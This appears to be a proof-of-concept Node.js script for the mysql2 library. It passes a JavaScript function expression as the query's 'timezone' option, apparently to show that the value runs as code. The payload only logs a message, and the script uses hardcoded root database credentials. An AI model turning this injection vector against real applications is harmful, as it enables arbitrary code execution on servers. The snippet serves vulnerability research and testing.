const mysql = require('mysql2');
const connection = mysql.createConnection({
  host: '127.0.0.1',
  user: 'root',
  database: 'test',
  password: '123456',
});

let query_data = {
  sql: `SELECT CURDATE();`,
  timezone:
    "(() => { console.log('success'); })()",
};

connection.query(query_data, (err, results) => {
  if (err) throw err;
  console.log(results);
});

connection.end();

